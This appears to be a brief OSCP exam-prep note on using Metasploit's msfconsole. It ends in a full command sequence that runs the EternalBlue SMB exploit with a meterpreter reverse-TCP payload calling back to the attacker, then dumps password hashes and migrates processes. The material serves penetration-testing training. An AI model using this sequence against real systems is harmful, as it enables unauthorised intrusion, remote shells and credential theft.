# 15.01 Metasploit Workflow

> Drive `msfconsole` modules (auxiliary, exploit, post) with `show options`/targets/payloads — limited to one exploit module on exam.

## Overview

msfconsole groups modules: auxiliary (scanners/brute), exploit (gain code exec), post (after-shell). Each module has options (`show options`), targets, and payloads. Use sparingly on OSCP — only one exploit module + the main run is permitted.

## Steps

- **msfconsole** — start; load.
- **search / use / show options / set / run** — universal loop.
- **Pick the right payload** — staged vs unstaged (x/x_reverse_tcp).
- **Move to native after** — migrate to keep the session alive.

## Commands

### Common flow

```text
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT <LPORT>
run
# in meterpreter
sysinfo; getuid; hashdump; migrate -N explorer.exe
```
